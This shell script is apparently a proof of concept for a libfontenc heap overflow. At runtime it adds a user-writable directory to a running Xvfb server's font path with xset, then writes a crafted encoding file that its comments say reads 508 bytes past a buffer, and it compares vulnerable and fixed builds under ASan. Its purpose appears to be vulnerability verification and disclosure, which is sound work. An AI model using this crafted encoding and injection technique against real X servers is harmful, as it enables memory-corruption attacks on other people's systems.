#!/bin/sh
# Inject a crafted encoding into a RUNNING loopback X server over the X
# protocol, without a privileged font directory or a server restart.
#
# The server starts with an unrelated font path.  A client then adds a
# user-writable temp font directory with `xset +fp` / `xset fp rehash`; only
# afterwards is the malicious .enc written into that directory.  A second
# client opens a Type1 font whose XLFD charset resolves to that .enc through
# libfontenc.  This complements run-live.sh, where -fp already names the
# crafted directory at server startup.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
BASE=$(CDPATH= cd -- "$HERE/../.." && pwd)
OUT="$BASE/realpath/evidence/xset-fp"
ASANLIB=$(cc -print-file-name=libasan.so)
PFB="$HERE/type1fonts/NimbusMonoPS-Regular.pfb"

XLFD_SAFE='-urw-nimbus mono ps-regular-r-normal--0-0-0-0-p-0-crafted-safe'
XLFD_EVIL='-urw-nimbus mono ps-regular-r-normal--0-0-0-0-p-0-crafted-evil'
mkdir -p "$OUT"
: > "$OUT/matrix.txt"

log() { printf '%s\n' "$*" | tee -a "$OUT/matrix.txt"; }

# $1 variant, $2 case, $3 display; server already running on $3.
open_font() { # variant case display XLFD logpfx
    of_variant=$1; of_case=$2; of_disp=$3; of_xlfd=$4; of_pfx=$5
    of_asanbase=${of_pfx%%.*}
    of_rc=0
    of_before=$(ls "$OUT/$of_asanbase.asan."* 2>/dev/null | wc -l)
    DISPLAY=":$of_disp" "$HERE/xfon-load" ":$of_disp" "$of_xlfd" \
        > "$OUT/$of_pfx.client.out" 2>&1 || of_rc=$?
    of_after=$(ls "$OUT/$of_asanbase.asan."* 2>/dev/null | wc -l)
    of_new=$((of_after - of_before))
    of_summary=$(sed -n '2p' "$OUT/$of_pfx.client.out")
    log "$of_variant $of_case client_rc=$of_rc new_asan_logs=$of_new $of_summary"
    if [ "$of_new" -gt 0 ]; then
        cp "$OUT/$of_asanbase.asan."* "$OUT/$of_pfx.asan.txt"
    fi
}

run_case() { # variant case display
    variant=$1; casename=$2; disp=$3
    pfx="$variant-$casename"
    rm -f "$OUT/$pfx".*
    CRAFTED=$(mktemp -d /tmp/libfontenc-xsetfp-XXXXXX)
    cp "$PFB" "$CRAFTED/NimbusMonoPS-Regular.pfb"
    cat > "$CRAFTED/fonts.dir" <<EOF
2
NimbusMonoPS-Regular.pfb
-urw-nimbus mono ps-regular-r-normal--0-0-0-0-p-0-crafted-safe
NimbusMonoPS-Regular.pfb
-urw-nimbus mono ps-regular-r-normal--0-0-0-0-p-0-crafted-evil
EOF
    cat > "$CRAFTED/encodings.dir" <<EOF
2
crafted-safe crafted-safe.enc
crafted-evil crafted-evil.enc
EOF
    printf 'STARTENCODING crafted-safe\nSIZE 256 256\nSTARTMAPPING unicode\n0x00ff 0x5a5a\nENDMAPPING\nENDENCODING\n' > "$CRAFTED/crafted-safe.enc"
    # Both .enc files are safe at xset time; the attack file is written later.
    cp "$CRAFTED/crafted-safe.enc" "$CRAFTED/crafted-evil.enc"

    launched=$(date -u +%Y-%m-%dT%H:%M:%S.%NZ)
    ASAN_OPTIONS="detect_leaks=0:abort_on_error=0:log_path=$OUT/$pfx.asan" \
    LD_PRELOAD="$ASANLIB:$BASE/build-$variant/out-asan/libfontenc.so.1.0.0" \
    Xvfb ":$disp" -screen 0 640x480x24 -nolisten tcp -noreset \
        -fp "$HERE/fonts" > "$OUT/$pfx.xvfb.out" 2>&1 &
    pid=$!
    sleep 3
    started=$(date -u +%Y-%m-%dT%H:%M:%S.%NZ)

    # Negative control: the crafted charsets are not reachable before xset.
    open_font "$variant" "$casename-no-xset" "$disp" "$XLFD_SAFE" "$pfx.start"

    # Runtime injection: X protocol requests to the already-running server.
    DISPLAY=":$disp" xset +fp "$CRAFTED" > "$OUT/$pfx.xset.out" 2>&1
    DISPLAY=":$disp" xset fp rehash >> "$OUT/$pfx.xset.out" 2>&1
    xset_rc=$?
    open_font "$variant" "$casename-safe-after-xset" "$disp" "$XLFD_SAFE" "$pfx.safe"

    # Write the attack encoding AFTER the server started and after xset.
    printf 'STARTENCODING crafted-evil\nSIZE 256 258\nSTARTMAPPING unicode\n0xff00 0x5a5a\nENDMAPPING\nENDENCODING\n' > "$CRAFTED/crafted-evil.enc"
    written=$(date -u +%Y-%m-%dT%H:%M:%S.%NZ)
    stat -c 'attack-enc %n size=%s mtime=%y' "$CRAFTED/crafted-evil.enc" >> "$OUT/$pfx.encstat.txt"
    printf 'server_launched=%s first_client_after_start=%s xset_rc=%s attack_written=%s crafted_dir=%s\n' \
        "$launched" "$started" "$xset_rc" "$written" "$CRAFTED" > "$OUT/$pfx.timeline.txt"
    open_font "$variant" "$casename-attack-after-write" "$disp" "$XLFD_EVIL" "$pfx.attack"

    kill "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
    printf 'attack-enc-written-after-server-start\n' >> "$OUT/$pfx.timeline.txt"
}

log "$(date -u +%Y-%m-%dT%H:%M:%SZ) runtime font-path injection matrix"
run_case vuln vend 101
run_case fixed fend 102
log "ASan log prefixes under $OUT; 258 input = 508 bytes past the buffer"
